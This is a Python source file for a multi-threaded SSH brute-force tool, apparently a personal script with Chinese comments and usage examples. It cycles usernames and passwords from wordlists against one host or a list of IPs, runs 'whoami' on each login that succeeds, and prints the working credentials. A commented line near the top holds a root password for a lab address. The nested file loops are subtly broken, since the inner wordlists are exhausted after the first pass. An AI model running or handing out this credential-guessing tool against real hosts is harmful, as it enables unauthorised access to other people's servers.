import argparse
import datetime
import paramiko
import platform
import re
import ftplib
import threading
from queue import Queue


# ip = "192.168.148.128"
# port = "22"
# username = "root"
# password = "981129"
# SSH_CON_TIMEOUT = 10
'''
多线程SSH爆破，可以实现多ip，多端口，自定义账号密码字典，自定义爆破
'''

class Mybruster:
    def __init__(self, ip=None, ipfile=None, port=None, queue=None, username=None, password=None, userfile=None,
                 passfile=None, timeout=5):
        self.ip = ip
        self.ipfile = ipfile
        self.port = port
        self.queue = queue
        self.username = username
        self.password = password
        self.userfile = userfile
        self.passfile = passfile
        self.timeout = timeout
        # self.ssh = paramiko.SSHClient()   # 一个ssh对象只能同一时刻进行一个ssh连接，否则会报错
        self.ip_success_list = []
        # print(passfile)
        # 生产者 初始化执行
        self.get_data_from_file(self.ip, self.ipfile, self.username, self.password, self.userfile, self.passfile)

    # 获取数据传入管道
    def get_data_from_file(self, ip=None, ipfile=None, username=None, password=None, userfile=None, passfile=None):
        # 单IP
        # print(ip)
        # print(passfile)
        if ip is not None:
            if userfile is not None and passfile is not None:
                with open(userfile, 'r') as f:
                    with open(passfile, 'r') as g:
                        for userline in f:
                            for passline in g:
                                self.queue.put((ip, userline.strip(), passline.strip()))
                                # print((ip, userline.strip(), passline.strip()))
            elif username is not None and passfile is not None:
                with open(passfile, 'r') as g:
                    for passline in g:
                        self.queue.put((ip, username, passline.strip()))
                        # print((ip, username, passline.strip()))
            elif username is not None and password is not None:
                self.queue.put((ip, username, password))
                print((ip, username, password))
            else:
                print("params set error!")
                exit(1)
        # 多 IP 情况
        elif ipfile is not None:
            if userfile is not None and passfile is not None:
                with open(ipfile, 'r') as e:
                    with open(userfile, 'r') as f:
                        with open(passfile, 'r') as g:
                            for ipline in e:
                                for userline in f:
                                    for passline in g:
                                        self.queue.put((ipline.strip(), userline.strip(), passline.strip()))
                                        # print((ipline.strip(), userline.strip(), passline.strip()))
            elif username is not None and passfile is not None:
                with open(ipfile, 'r') as e:
                    with open(passfile, 'r') as g:
                        for ipline in e:
                            for passline in g:
                                self.queue.put((ipline.strip(), username, passline.strip()))
                                # print((ip, username, passline.strip()))
            elif username is not None and password is not None:
                with open(ipfile, 'r') as e:
                    for ipline in e:
                        self.queue.put((ipline.strip(), username, password))
                        # print((ipline.strip(), username, password))
            else:
                print("params set error!")
                exit(1)

    def ssh_bruster(self, ip, port, username, password, timeout=5):
        # pass
        try:
            print('[*] try login ssh {}@{}:{} .....'.format(username, ip, port))
            ssh_ob = paramiko.SSHClient()
            # 创建一个ssh的白名单 paramiko.AutoAddPolicy()
            # #加载创建的白名单
            ssh_ob.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            # compress 启用压缩
            ssh_ob.connect(ip, port=int(port), username=username, password=password, compress=True,
                             timeout=timeout)
            stdin, stdout, stderr = ssh_ob.exec_command("whoami")  # stdin为输入，stdout为正确输出，stderr为错误输出，同时只有一个变量有值。
            # print('[+] Login successfully')
            print('[+] Success, {}:{}, username:{}, password:{}, whoami:{}'.format(ip, port, username, password,
                                                                                stdout.read().decode('utf-8')))
            self.ip_success_list.append(ip)
            # self.ssh.close()
            return ip
        except Exception as e:
            # 调试的时候打开下面这句看是什么错误 如果登录不成功会显示如下错误授权失败 Error: Authentication failed.
            # print("Error:", e)
            ssh_ob.close()
            return None


    # 多线程+
    def start(self):
        while not self.queue.empty():
            ip, username, password = self.queue.get()
            # 加一个列表，当IP爆破成功后，将IP加入列表，防止其他线程再爆破。
            if ip in self.ip_success_list:
                pass
            else:
                self.ssh_bruster(ip=ip, port=self.port, username=username, password=password, timeout=self.timeout)


if __name__ == '__main__':
    usage = """
        SSH bruster By komomon
        python test32.py -H 192.168.148.128 --user root -pf asdf.txt
        python test32.py -H 192.168.148.128 -uf user.txt -pf pass.txt
        python test32.py -H 192.168.148.128 -p 222 -uf user.txt -pf pass.txt
        python test32.py -H 192.168.148.128 -p 222 -uf user.txt -pf pass.txt -t 50 --timeout=10
        python test32.py -if ipfile.txt -p 222 -uf user.txt -pf pass.txt -t 50 --timeout=10
    """
    parser = argparse.ArgumentParser(usage=usage, description="des")
    parser.add_argument("-H", "--host", type=str, dest="host", help="Hosts to scan")
    parser.add_argument("-if", "--ipfile", type=str, dest="ipfile", help="IP file")
    parser.add_argument("-p", "--port", type=int, dest="port", default=22, help="Port to scan")
    parser.add_argument("--user", type=str, dest="username", help="Username")
    parser.add_argument("--pass", type=str, dest="password", help="Password")
    parser.add_argument("-uf", "--userfile", type=str, default=None, dest="userfile", help="Username file")
    parser.add_argument("-pf", "--passfile", type=str, default=None, dest="passfile", help="Password file")
    parser.add_argument("-t", "--threads", type=int, default=10, dest="threads", help="Threads")
    parser.add_argument("--timeout", type=int, default=5, dest="timeout", help="Request timeout")
    args = parser.parse_args()

    Host = args.host
    Port = args.port
    Ipfile = args.ipfile
    Username = args.username
    Password = args.password
    Userfile = args.userfile
    Passfile = args.passfile
    Thread_maxnum = args.threads
    Timeout = args.timeout
    print("Bruster bot is running...")
    # print(Passfile)
    MY_QUEUE = Queue()
    thread_list = []
    if args.timeout != 0 and args.timeout > 0:
        timeout = args.timeout
    else:
        print("--timeout Setting error.")
        exit(1)
    bruster_bot = Mybruster(ip=Host, ipfile=Ipfile, port=Port, queue=MY_QUEUE, username=Username, password=Password,
                            userfile=Userfile, passfile=Passfile, timeout=Timeout)

    for i in range(Thread_maxnum):
        # 注意target参数没有(),有()会线程卡死，应该是根据名称去起线程执行函数
        thread = threading.Thread(target=bruster_bot.start)
        thread_list.append(thread)
    for thread in thread_list:
        thread.start()
    for thread in thread_list:
        thread.join()
